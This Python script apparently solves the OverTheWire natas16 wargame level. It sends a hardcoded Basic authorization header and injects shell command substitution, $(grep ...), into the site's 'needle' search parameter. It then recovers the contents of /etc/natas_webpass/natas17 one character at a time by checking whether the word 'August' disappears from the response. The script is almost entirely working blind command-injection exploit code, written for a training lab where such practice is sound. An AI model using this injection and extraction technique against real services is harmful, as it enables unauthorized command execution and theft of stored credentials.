import requests
import string
from auth import *

session = requests.session()
session.headers["Authorization"] = "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
def getURL(command):
    return f"http://natas16.natas.labs.overthewire.org/?needle=August$({command})&submit=Search"

x = session.get(getURL("WHOAMI"))
#print(x.text)

possibleLetters = string.ascii_letters + "0123456789"

newlist = []



for I in possibleLetters:
    x = session.get(getURL("grep " + I + " /etc/natas_webpass/natas17"))
    if "August" not in x.text:
        newlist.append(I)
        print(I, end="")

print()
newPassString =""
foundletter=True
while foundletter :
    foundletter = False
    for I in newlist:
        x = session.get(getURL("grep ^" + newPassString + I + " /etc/natas_webpass/natas17"))
        if "August" not in x.text:
            newPassString += I
            print(I, end="")
            foundletter = True
            break








        #(leter)$(cat /etc/natas_webpass/natas17)
        #if it is exist, we add letter, to a new varible, then we do again so its new varible + next letter